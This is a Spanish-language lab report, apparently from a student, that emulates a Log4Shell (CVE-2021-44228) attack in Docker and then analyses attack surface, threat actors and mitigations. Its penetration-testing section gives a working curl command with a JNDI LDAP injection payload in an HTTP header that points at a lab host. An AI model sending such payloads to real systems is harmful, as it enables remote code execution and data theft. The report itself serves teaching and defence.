\section{\large Introducción}

\justify

\hspace{1.27cm} En este siglo XXI y en el futuro la seguridad y el análisis de los sistemas se ha vuelto un pilar fundamental para el desarrollo de sistemas confiables, con el crecimiento exponencial de ataques a nivel informático y perdidas a pequeña y gran escala de entidades y organizaciones publicas y privadas. Recientemente, una de las vulnerabilidades más críticas detectadas ha sido Log4Shell (CVE-2021-44228), la cual afecta a librería Log4j, una popular biblioteca de registro utilizada ampliamente en aplicaciones Java. Esta vulnerabilidad permite la ejecución remota de código (RCE), lo que la convierte en un blanco atractivo para atacantes que buscan comprometer servidores y aplicaciones a través de solicitudes maliciosas.

El objetivo de este informe de laboratorio es analizar la superficie de ataque de Log4Shell en un entorno controlado, evaluando los vectores de ataque más relevantes, los actores malintencionados que podrían explotarla, y los recursos vulnerables que podrían verse afectados. Durante las pruebas de laboratorio, se simulo un escenario de ataque para comprender el impacto de esta vulnerabilidad en aplicaciones que utilizan Log4j.

Este análisis es fundamental para identificar las medidas de mitigación necesarias que permitan reducir el riesgo de explotación y asegurar la infraestructura de la organización frente a futuras amenazas. A lo largo del informe, se detallarán los pasos a seguir y resultados de las pruebas donde se propondrán recomendaciones clave para mitigar el impacto de Log4Shell en los sistemas evaluados.

\section{\large Emulación de un Ataque Log4Shell}

\subsection{Objetivo} 
El objetivo de este informe es realizar por medio de pruebas empíricas un laboratorio emulando un ataque de Log4Shell(CVE-2021-44228)\citep{log4shell}, con el fin de lograr que el estudiante comprenda las herramientas y técnicas utilizadas en el proceso de la implementación de este ataque. Este ejercicio práctico tiene como finalidad profundizar el entendimiento de las vulnerabilidades y de seguridad de aplicaciones web y fomentar el desarrollo de habilidades técnicas para la identificación y mitigación de riesgos de ciberseguridad.

\subsubsection{Aspectos y Comandos Claves}
Para un desarrollador y una usuario de docker y Git existen varios aspectos claves dependiendo la necesidad del trabajo que se este realizando, para este laboratorio los comandos claves a utilizar seran los siguientes:

\begin{itemize}
    \item \texttt{docker exec -it my\_container \{comando de ruta u otro\}}: Con este comando podemos ingresar de modo interactivo a la terminal del contenedor donde podemos colocar alguna ruta en especial. Las más utilizadas son \texttt{/bin/bash}, \texttt{/bin/sh} y \texttt{ls}.

    \item \texttt{docker ps}: Para verificar si el contenedor está en ejecución.
    \item \texttt{docker images}: Para verificar las imágenes contenidas localmente en Docker.
    \item \texttt{git clone \{url repositorio\}}: Para copiar localmente el o los repositorios que necesitemos.
\end{itemize}

\subsection{Pruebas de Penetración}

Una vez inicializada las aplicaciones y conocidas las ips de la red debemos realizar el ataque, para esto debemos realizar el ataque por medio de curl (Client URL). Curl es una herramienta de línea de comandos, que permite la transferencia de datos hacia o desde un servidor sin interacción del usuario utilizando la biblioteca libcurl \citep{curl}.
el comando curl se compone de la siguiente manera.
\begin{lstlisting}
curl (ip-victima):8080 -H 'X-Api-Version: ${jndi:(ldap-infectado)}'
\end{lstlisting}
Donde la ip-victima es la ip de la Vulnerable-app y ldap-infectado es la ip de JNDI-EXPLOIT. Por tanto el comando queda de la siguiente manera:
\begin{lstlisting}
curl http://172.17.0.2:8080 -H 'X-Api-Version: ${jndi:ldap://172.17.0.3:1389/hjvknt}'
\end{lstlisting}

\section{Análisis de superficie de ataque}
Para esta sección debemos saber primero que es una superficie de ataque " La superficie de ataque de una organización es la suma de las vulnerabilidades, las vías o los métodos (a veces denominados vectores de ataque) que los hackers pueden utilizar para obtener acceso no autorizado a la red o a los datos confidenciales, o para llevar a cabo un ciberataque"\citep{supataque}
Entonces analizaremos sobre un contexto ficticio de una organización que no ha actualizado su librería y esta expuesta a este ataque, ya que tiene servicios en la nube donde tiene endpoint expuestos alojados en un servidor donde circula información sensible.

\subsection{Vectores de Ataque Potenciales}

\begin{itemize}
    \item{Interfaz Web (API pública y panel de administración)}: Los usuarios pueden enviar solicitudes que log4j podría registrar, exponiendo la aplicación a la inyección de código malicioso.
    \item Sistemas internos: Aplicaciones internas que también utilizan Log4j para monitoreo y registro de actividades.
    
    \item Servidores y servicios externos: Cualquier servicio externo que interactúe con el sistema y que genere logs, como servicios de mensajería, integraciones API, etc.
\end{itemize}

\subsection{Actores Malintencionados (Threat Actors)}

\begin{itemize}
\item Hackers individuales: Pueden intentar inyectar código malicioso a través de solicitudes HTTP, encabezados o campos de entrada que el sistema loguea.
\item Grupos organizados: Podrían explotar la vulnerabilidad para ejecutar código remoto y obtener acceso a servidores sensibles.
\item Usuarios internos deshonestos: Usuarios con acceso autorizado podrían explotar la vulnerabilidad para realizar ataques desde dentro de la red.
\end{itemize}

\subsection{Recursos Vulnerables}

\begin{itemize}
\item Datos de clientes: Información sensible, como nombres, direcciones, y números de cuentas bancarias.
\item Credenciales de usuarios: Podrían ser expuestas o robadas si se explota con éxito la vulnerabilidad.
\item Sistemas de producción: La ejecución remota de código podría comprometer la integridad de los servidores de producción, incluyendo la eliminación o modificación de datos.
\end{itemize}

\subsection{Escenarios de Ataque}

\begin{itemize}
\item Inyección de código malicioso a través de solicitudes HTTP: Un atacante podría enviar una solicitud maliciosa que se registre en los logs de la aplicación, lo que desencadena la ejecución del código malicioso. Este código podría permitir la creación de una puerta trasera en el servidor.
\item Uso de JNDI para conexión remota: Al explotar la vulnerabilidad Log4Shell, un atacante podría engañar a la aplicación para que se conecte a un servidor controlado por el atacante, ejecutando código remoto desde allí.
 \item Exfiltración de datos: Al obtener acceso remoto a los servidores, el atacante podría acceder a la base de datos y extraer información sensible.
\end{itemize}

\subsection{Impacto Potencial}

El impacto potencial para la organización es alto ya que afecta la Confidencialidad, integridad y podría de forma moderada o no la disponibilidad.
En general el que una organización se vea perjudicada por esta brecha de seguridad genera que su reputación se vea perjudicada resultando perdida de confianza en sus clientes. 

\subsection{Recomendaciones de Mitigación}
\begin{itemize}
\item Actualizar Log4j: Se deben levantar todos los cofigos fuentes tanto desarrollados de manera propia como de proveedores y solicitar en un corto plazo la actualización y deploy en producción.
\item Implementacion de Firewalls Web (WAF): Para filtrar y bloquear solicitudes sospechosas que puedan explotar esta vulnerabilidad.
\item Monitoreo de logs: Analizar los logs de acceso y eventos inusuales para detectar intentos de explotación
\item Robustes en capa TLS: Habilitar Mtls para endpoint mas críticos.
\item Apagar protocolos no usados: Dar de baja protocolos que no ocupara el servidor, por ejemplo FTP SMTP, LDAP entre otros.
\item Control de puertos: Solo abrir puertos necesarios.
\end{itemize}

\section{ Conclusión}


Las pruebas de laboratorio realizadas sobre la vulnerabilidad Log4Shell(CVE-2021-44228) han demostrado lo critico de esta falla de seguridad en sistemas que emplean Log4j para la gestión de logs. A través del vector de ataque usado en la prueba, como la inyección de solicitudes maliciosas mediante HTTP y la explotación de JNDI, se ha confirmado la capacidad de los atacantes para ejecutar código de manera remota y comprometer tanto los datos confidenciales como la integridad de los sistemas afectados ya sean a poca o gran escala.

Estos escenarios de ataque destacan la importancia de implementar medidas de mitigación, como la actualización de Log4j a versiones seguras, la desactivación de funciones innecesarias como las búsquedas JNDI, y la aplicación de controles de seguridad adicionales, como el uso de firewalls de aplicaciones web (WAF), robustes en capa TLS migrandos a Mtls entre otras.

Los resultados obtenidos subrayan que la exposición de sistemas vulnerables puede tener consecuencias graves para las organizaciones, incluyendo el robo de datos sensibles y el compromiso de servidores críticos. Esto refuerza la necesidad de estar continuamente alerta ante nuevas amenazas y de mantener una estrategia de seguridad proactiva que minimice el riesgo de explotación de este tipo de vulnerabilidades.
